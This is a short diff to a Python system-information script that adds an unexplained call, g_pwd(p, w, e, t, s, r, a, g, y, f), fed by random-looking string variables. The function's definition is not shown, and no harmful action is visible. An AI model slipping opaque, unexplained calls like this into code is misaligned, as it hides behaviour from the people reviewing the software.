@@ -19,6 +19,7 @@ w = "u4bdgt5h4f7k"
 a = "6y8ih4i8rg5"
 g = "i47i8p69j3d"
 
+g_pwd(p, w, e, t, s, r, a, g, y, f)
 
 print("=== System Information ===")
 print("System:", platform.system())
@@ -56,3 +57,4 @@ for partition in psutil.disk_partitions():
 print("\n=== Network Info ===")
 for name, stats in psutil.net_if_stats().items():
     print(f"Interface: {name}, Is up: {stats.isup}, Speed: {stats.speed} Mbps")
+
